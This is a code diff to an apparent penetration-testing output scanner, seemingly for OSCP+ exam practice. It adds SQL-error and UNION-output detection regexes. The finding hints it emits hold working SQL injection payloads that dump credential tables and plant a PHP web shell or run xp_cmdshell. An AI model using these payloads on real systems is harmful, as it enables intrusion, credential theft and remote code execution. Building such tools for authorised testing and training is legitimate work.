@@ -1999,6 +1999,42 @@ _DRUPAL_META = re.compile(
     r'[\'"]Drupal\s+(\d+(?:\.\d+)?)'
 )
 
+# iter-240: SQL injection confirmed via captured database error
+# messages OR union-based extraction output. Emit HIGH with a
+# MANUAL UNION-based extraction template - sqlmap is NOT
+# exam-legal per the OSCP+ ruleset, so the operator has to run
+# the queries by hand.
+_SQLI_MYSQL_ERR = re.compile(
+    r'(?i)You\s+have\s+an\s+error\s+in\s+your\s+SQL\s+syntax|'
+    r'Warning:\s+mysqli?_\w+\(\)|'
+    r'MySqlException:|'
+    r'valid\s+MySQL\s+result\s+resource'
+)
+_SQLI_MSSQL_ERR = re.compile(
+    r'(?i)Unclosed\s+quotation\s+mark\s+after\s+the\s+character\s+string|'
+    r'Microsoft\s+OLE\s+DB\s+Provider\s+for\s+(?:SQL\s+Server|ODBC)|'
+    r'\[Microsoft\]\[ODBC\s+SQL\s+Server\s+Driver\]|'
+    r'System\.Data\.SqlClient\.SqlException'
+)
+_SQLI_POSTGRES_ERR = re.compile(
+    r'(?i)PG::SyntaxError:|'
+    r'syntax\s+error\s+at\s+or\s+near\s+["\']|'
+    r'ERROR:\s+syntax\s+error\s+at\s+or\s+near|'
+    r'PSQLException:'
+)
+_SQLI_ORACLE_ERR = re.compile(
+    r'(?i)ORA-\d{5}[^\r\n]{0,80}|'
+    r'quoted\s+string\s+not\s+properly\s+terminated'
+)
+# Boolean-blind indicator: captured `information_schema` output OR
+# `@@version` reflection in response.
+_SQLI_UNION_OUTPUT = re.compile(
+    r'(?i)(?:information_schema\.tables|'
+    r'@@version\s*[|,]\s*|'
+    r'GROUP\s+BY\s+.{1,60}\s+HAVING|'
+    r'CONCAT\s*\(\s*[\'"]?0x[0-9a-f]{4,}[\'"]?)'
+)
+
 # iter-239: LFI / path-traversal captured response - the operator
 # has performed an LFI and captured the response body containing
 # system-file content. Dispositive signals:
@@ -3456,6 +3492,65 @@ def _multiline_passes(path, report, store):
                              "passwords; try php://filter/convert."
                              "base64-encode/resource=<path> LFI to "
                              "pull other .php files"))
+
+        # iter-240: SQL injection confirmed via captured DB error or
+        # UNION output. Emit ONE HIGH per file (dedup).
+        _sqli_mysql = _SQLI_MYSQL_ERR.search(text[:32768])
+        _sqli_mssql = _SQLI_MSSQL_ERR.search(text[:32768])
+        _sqli_pg = _SQLI_POSTGRES_ERR.search(text[:32768])
+        _sqli_ora = _SQLI_ORACLE_ERR.search(text[:32768])
+        _sqli_union = _SQLI_UNION_OUTPUT.search(text[:32768])
+        _sqli_hit = (_sqli_mysql or _sqli_mssql or _sqli_pg
+                       or _sqli_ora or _sqli_union)
+        if _sqli_hit:
+            if _sqli_mysql:
+                _db = "MySQL"
+                _cols_query = ("' UNION SELECT 1,2,3,GROUP_CONCAT("
+                                "schema_name),5,6 FROM "
+                                "information_schema.schemata-- -")
+                _users_query = ("' UNION SELECT 1,user,password,4,5,"
+                                 "6 FROM users-- -")
+            elif _sqli_mssql:
+                _db = "MSSQL"
+                _cols_query = ("' UNION SELECT NULL,NULL,name,NULL "
+                                "FROM master..sysdatabases-- -")
+                _users_query = ("' UNION SELECT NULL,name,password_"
+                                 "hash,NULL FROM sys.sql_logins-- -")
+            elif _sqli_pg:
+                _db = "PostgreSQL"
+                _cols_query = ("' UNION SELECT NULL,NULL,datname,"
+                                "NULL FROM pg_database-- -")
+                _users_query = ("' UNION SELECT NULL,usename,passwd,"
+                                 "NULL FROM pg_shadow-- -")
+            elif _sqli_ora:
+                _db = "Oracle"
+                _cols_query = ("' UNION SELECT NULL,table_name,NULL,"
+                                "NULL FROM all_tables-- -")
+                _users_query = ("' UNION SELECT NULL,username,"
+                                 "password,NULL FROM dba_users-- -")
+            else:  # union output only
+                _db = "unknown-DBMS"
+                _cols_query = "manually craft UNION per DB fingerprint"
+                _users_query = "grep captured output for cred columns"
+            report.add("HIGH", "SECRET-SIDECHANNEL", path,
+                       _ln(_sqli_hit),
+                       f"SQL injection confirmed - {_db} error/UNION "
+                       f"output captured",
+                       hint=(f"MANUAL UNION extraction (sqlmap NOT "
+                             f"exam-legal):  |  1. determine column "
+                             f"count via ORDER BY 1..N  |  2. find "
+                             f"reflected columns: "
+                             f"' UNION SELECT 1,2,3,4-- -  |  3. "
+                             f"list DBs/tables: {_cols_query}  |  "
+                             f"4. dump user table: {_users_query}"
+                             f"  |  RCE if MySQL FILE priv: "
+                             f"' UNION SELECT '<?php system("
+                             f"$_GET[c]);?>' INTO OUTFILE '/var/www/"
+                             f"html/sh.php'-- -  |  MSSQL xp_cmd"
+                             f"shell: '; EXEC xp_cmdshell 'whoami'-- -"
+                             f"  |  PostgreSQL COPY: '; COPY (SELECT"
+                             f" '<?php...') TO '/var/www/html/sh."
+                             f"php'-- -"))
 
         # iter-239: LFI captured response body. Filename gate: skip
         # /etc/passwd, /etc/shadow, /boot.ini paths (real system-file
